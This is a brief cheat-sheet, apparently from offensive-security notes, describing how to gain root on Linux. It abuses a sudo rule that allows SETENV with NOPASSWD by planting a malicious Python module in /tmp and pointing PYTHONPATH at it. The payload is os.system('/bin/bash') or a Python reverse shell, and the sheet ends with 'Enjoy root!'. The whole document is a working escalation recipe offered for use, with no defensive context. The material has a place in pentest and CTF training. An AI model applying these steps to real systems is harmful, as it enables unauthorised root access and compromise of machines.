### There are multiple ways to escalate with python

## EXAMPLES:

#### 1) SETENV: NOPASSWD /usr/bin/python /home/whatever/script.py

#### 2) Check if you can overwrite an already existing module in python, or simply create the missing import module that the script asks

#### E.g.: ImportError: No module named pwned

#### 3) Create the malicious binary in any directory we have write access to (/tmp directory as usual)

#### 4) The payload can be (import os; os.system('/bin/bash') or a python reverse shell.

#### 5) chmod +x pwned.py

#### 6) sudo PYTHONPATH/tmp/ /usr/bin/python /home/whatever/script.py

#### 7) Enjoy root!
